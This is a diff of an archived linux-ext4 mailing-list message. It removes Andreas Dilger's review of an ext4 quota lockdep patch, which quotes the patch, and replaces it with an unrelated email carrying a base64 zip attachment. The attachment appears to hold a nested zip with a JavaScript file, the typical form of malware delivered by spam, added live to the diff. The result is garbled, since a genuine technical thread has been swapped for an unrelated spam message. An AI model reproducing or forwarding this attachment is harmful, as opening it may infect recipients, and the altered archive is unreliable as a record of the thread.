@@ -1,159 +1,75 @@
-From: Andreas Dilger <adilger@dilger.ca>
-Subject: Re: [PATCH] ext4: Clear lockdep subtype for quota files on quota off
-Date: Fri, 5 May 2017 14:20:38 -0600
-Message-ID: <0A0D0EE6-38A2-4701-87EF-E8D63CA136C0@dilger.ca>
-References: <20170505085327.27103-1-jack@suse.cz>
-Mime-Version: 1.0 (Mac OS X Mail 10.3 \(3273\))
-Content-Type: multipart/signed;
- boundary="Apple-Mail=_616CD087-4732-4E60-AC69-90710362D393";
- protocol="application/pgp-signature"; micalg=pgp-sha1
-Cc: Ted Tso <tytso@mit.edu>, linux-ext4@vger.kernel.org,
-        Ross Zwisler <ross.zwisler@linux.intel.com>
-To: Jan Kara <jack@suse.cz>
+From: <editor@coastreporter.net>
+Subject: 13994 linux-ext4
+Date: Sat, 06 May 2017 00:33:04 -0000
+Message-ID: <149403078466.26770.17941178705135107591@vnpt.vn>
+Mime-Version: 1.0
+Content-Type: application/zip; name="4.zip"
+Content-Transfer-Encoding: base64
+To: <linux-ext4@vger.kernel.org>
 Return-path: <linux-ext4-owner@vger.kernel.org>
-Received: from mail-io0-f193.google.com ([209.85.223.193]:36776 "EHLO
-        mail-io0-f193.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1755892AbdEEUUt (ORCPT
-        <rfc822;linux-ext4@vger.kernel.org>); Fri, 5 May 2017 16:20:49 -0400
-Received: by mail-io0-f193.google.com with SMTP id x86so3857834ioe.3
-        for <linux-ext4@vger.kernel.org>; Fri, 05 May 2017 13:20:49 -0700 (PDT)
-In-Reply-To: <20170505085327.27103-1-jack@suse.cz>
+Received: from static.vnpt.vn ([14.169.46.111]:44217 "HELO vnpt.vn"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751499AbdEFAdL (ORCPT <rfc822;linux-ext4@vger.kernel.org>);
+        Fri, 5 May 2017 20:33:11 -0400
+Content-Disposition: attachment
 Sender: linux-ext4-owner@vger.kernel.org
 List-ID: <linux-ext4.vger.kernel.org>
 
-
---Apple-Mail=_616CD087-4732-4E60-AC69-90710362D393
-Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain;
-	charset=us-ascii
-
-On May 5, 2017, at 2:53 AM, Jan Kara <jack@suse.cz> wrote:
->=20
-> Quota files have special ranking of i_data_sem lock. We inform lockdep
-> about it when turning on quotas however when turning quotas off, we
-> don't clear the lockdep subclass from i_data_sem lock and thus when =
-the
-> inode gets later reused for a normal file or directory, lockdep gets
-> confused and complains about possible deadlocks. Fix the problem by
-> resetting lockdep subclass of i_data_sem on quota off.
->=20
-> Reported-by: Ross Zwisler <ross.zwisler@linux.intel.com>
-> Signed-off-by: Jan Kara <jack@suse.cz>
-
-Fixes: daf647d2dd58cec59570d7698a45b98e580f2076
-Reviewed-by: Andreas Dilger <adilger@dilger.ca>
----
-The change to skip clearing the NOATIME/IMMUTABLE inode flags and times
-on every mount/unmount when the journaled quota feature is enabled is
-good, since it avoids needless overhead, but isn't really described in
-the commit comment.  This isn't directly related to the lockdep, but
-rather improving 957153fce8d2 "ext4: Set flags on quota files directly"
-AFAICS.
-
-It might be worthwhile to add a line to this commit like:
-
- Don't clear NOATIME/IMMUTABLE flags when journaled quota is enabled.
-
-It also looks like ext4_quota_on() could use a similar check, to avoid
-setting the NOATIME/IMMUTABLE flags on every mount if they are already
-set.
-
-I guess it isn't harmful to clear IMMUTABLE in the case of non-journaled
-quotas, to maximize compatibility with older quota utilities, so long as
-we don't incur this needless overhead for the newer journaled quota =
-case.
-
-
-There is a separate issue of what to do if the filesystem wasn't =
-unmounted
-cleanly and IMMUTABLE is still set?  If the userspace quotacheck always
-clears IMMUTABLE when it is run, then there isn't much benefit in =
-setting
-the IMMUTABLE flag in the first place.  Is there some other way that the
-userspace quota utilities know whether it is safe to update the quota =
-files?
-
-One possibility would be to use a similar open(O_EXCL) hack as we use
-with block devices to avoid userspace trying to modify the quota file =
-while
-the kernel is using it?
-
-Cheers, Andreas
-
-> ---
-> fs/ext4/super.c | 14 +++++---------
-> 1 file changed, 5 insertions(+), 9 deletions(-)
->=20
-> diff --git a/fs/ext4/super.c b/fs/ext4/super.c
-> index a9c72e39a4ee..77043dc7f704 100644
-> --- a/fs/ext4/super.c
-> +++ b/fs/ext4/super.c
-> @@ -846,14 +846,9 @@ static inline void ext4_quota_off_umount(struct =
-super_block *sb)
-> {
-> 	int type;
->=20
-> -	if (ext4_has_feature_quota(sb)) {
-> -		dquot_disable(sb, -1,
-> -			      DQUOT_USAGE_ENABLED | =
-DQUOT_LIMITS_ENABLED);
-> -	} else {
-> -		/* Use our quota_off function to clear inode flags etc. =
-*/
-> -		for (type =3D 0; type < EXT4_MAXQUOTAS; type++)
-> -			ext4_quota_off(sb, type);
-> -	}
-> +	/* Use our quota_off function to clear inode flags etc. */
-> +	for (type =3D 0; type < EXT4_MAXQUOTAS; type++)
-> +		ext4_quota_off(sb, type);
-> }
-> #else
-> static inline void ext4_quota_off_umount(struct super_block *sb)
-> @@ -5476,7 +5471,7 @@ static int ext4_quota_off(struct super_block =
-*sb, int type)
-> 		goto out;
->=20
-> 	err =3D dquot_quota_off(sb, type);
-> -	if (err)
-> +	if (err || ext4_has_feature_quota(sb))
-> 		goto out_put;
->=20
-> 	inode_lock(inode);
-> @@ -5496,6 +5491,7 @@ static int ext4_quota_off(struct super_block =
-*sb, int type)
-> out_unlock:
-> 	inode_unlock(inode);
-> out_put:
-> +	lockdep_set_quota_inode(inode, I_DATA_SEM_NORMAL);
-> 	iput(inode);
-> 	return err;
-> out:
-> --
-> 2.12.0
->=20
-
-
-Cheers, Andreas
-
-
-
-
-
-
---Apple-Mail=_616CD087-4732-4E60-AC69-90710362D393
-Content-Transfer-Encoding: 7bit
-Content-Disposition: attachment;
-	filename=signature.asc
-Content-Type: application/pgp-signature;
-	name=signature.asc
-Content-Description: Message signed with OpenPGP
-
------BEGIN PGP SIGNATURE-----
-Comment: GPGTools - http://gpgtools.org
-
-iD8DBQFZDN6XpIg59Q01vtYRAihSAKC3mxi7EMXCX3CJd4UtcZwtP9vhtQCfer3K
-ocr+Z2N+dvkmryy43uxj52Q=
-=uKOd
------END PGP SIGNATURE-----
-
---Apple-Mail=_616CD087-4732-4E60-AC69-90710362D393--
+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
+AAEAAQBbAAAATwwAAAAA
